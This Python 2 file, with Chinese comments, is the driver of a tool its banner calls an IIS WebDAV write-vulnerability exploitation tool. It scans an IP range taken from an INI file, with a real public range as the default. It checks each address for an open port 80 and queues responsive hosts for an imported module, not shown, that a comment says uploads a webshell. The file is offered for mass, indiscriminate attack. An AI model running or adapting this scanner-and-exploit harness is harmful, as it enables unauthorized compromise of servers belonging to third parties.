#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
####################################################################

import threading
import thread
import time
import socket
socket.setdefaulttimeout(10)  #设置了全局默认超时时间
import Queue
host_port_80 = Queue.Queue(7000)  #IIS——webdav 漏洞检测上传webshell
import IIS_webdav
import ConfigParser  #INI读取数据

class S_ip(threading.Thread):
    def __init__(self,htint,bengip,endip,host_port_80):
        threading.Thread.__init__(self)
        self.Ht=htint  #线程ID
        self.bengip=bengip
        self.endip=endip
        self.host_port_80=host_port_80
        threads = []  #线程
        for i in range(3):  #nthreads=10  创建10个线程
            threads.append(IIS_webdav.IIS(host_port_80))

        for t in threads:   #不理解这是什么意思    是结束线程吗
            t.start()  #start就是开始线程

    def run(self):
        try:
            print u"<<<端口扫描-线程%d启动"%(self.Ht)
            #self.open_sqlite()     #读取IP
            self.socket_ip(self.bengip,self.endip)#生成IP扫描
            #thread.start_new_thread(self.socket_port,("218.6.2.86"))
        except BaseException, e:
            print(str(e))
            print u"=================S_ip---run异常！！！！！================="
            time.sleep(60)
            self.run()

    def socket_ip(self,bengip,endip):#生成IP扫描
        try:
            self.t=time.time()  #扫描计时
            list_ip=self.gen_ip(self.ip2num(bengip),self.ip2num(endip))
            print u"开始IP:%s----结束IP:%s"%(bengip,endip)
            print u"<<<端口扫描-线程%d--需要扫描%s个IP-----------%s"%(self.Ht,str(len(list_ip)),time.strftime('%Y.%m.%d-%H.%M.%S'))
            I1 = 0 #得到list的第一个元素
            while I1 < len(list_ip):
                #print list_ip[I1]
                try:
                    time.sleep(0.3) #确保先运行Seeker中的方法
                    thread.start_new_thread(self.socket_port,(list_ip[I1],))
                    I1 = I1 + 1   #一层
                except:
                #                    #print ".",
                    continue #跳过本次循环

            print u"<<<端口扫描-线程%d--%s---%s--==IP扫描完成结束%s=====用时%s<<<"%(self.Ht,bengip,endip,time.strftime('%Y.%m.%d-%H.%M.%S'),time.time()-self.t)
        except:
            print u"<<<端口扫描-线程%d--S_ip--异常！！！！！"%(self.Ht)

    def socket_port(self,ip):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:   #PORT:80
                s.connect((ip,80))
                #print ip,u":",80,u"端口开放"
                if ~self.host_port_80.full(): #如果队列满了  取反
                    self.host_port_80.put(ip,0.3) #
            except:
                a=None
        except:
            #print "s",
            #print ip,u":",PORT,u"端口未开放"
            return 0
        #----------------------------------------------------------------
    def ip2num(self,ip):
        ip = [int(x) for x in ip.split('.')]
        return ip[0]<<24 | ip[1]<<16 | ip[2]<<8 | ip[3]

    def num2ip(self,num):
    #if num>=IPend:
    #self.textEdit_4.append(u"IP导入数组完成")
        return '%s.%s.%s.%s' % (  (num & 0xff000000) >> 24,
                                  (num & 0x00ff0000) >> 16,
                                  (num & 0x0000ff00) >> 8,
                                  num & 0x000000ff  )

    def gen_ip(self,Aip1,Aip2):  #返回数组
        global IPend
        IPend=Aip2
        return [self.num2ip(num) for num in range(Aip1,Aip2+1) if num & 0xff]
        #----------------------------------------------------------------


if __name__ == '__main__':
    print "---------------------------------------------------------------------"
    print u"         IIS 写入漏洞   IIS_webdav      漏洞利用工具      "
    print u"         gost.ini配置文件  bengIP=开始IP   endIP=结束IP       "
    print u"         扫描结果保存在程序目录下     日期IIS_webdav.txt      "
    print u"                       http://hmhacker.org/            "
    print u"              QQ:2602159946------QQ群:293663651   "
    print "----------------------time:--------2013.6.9--------------------------"
    print "----------------------------------------------------------------------"

    bengIP="61.135.180.29"
    endIP="61.135.190.29"
    try:
        config = ConfigParser.ConfigParser()
        config.readfp(open("gost.ini"))
        bengIP= config.get("DATA","bengIP")
        endIP= config.get("DATA","endIP")
    except:
        print u"INI读取异常"


    threads = []  #线程
    nthreads=1
    for i in range(nthreads):  #nthreads=10  创建10个线程
        threads.append(S_ip(i,bengIP,endIP,host_port_80))

    for t in threads:   #不理解这是什么意思    是结束线程吗
        time.sleep(2) #确保先运行Seeker中的方法
        t.start()  #start就是开始线程





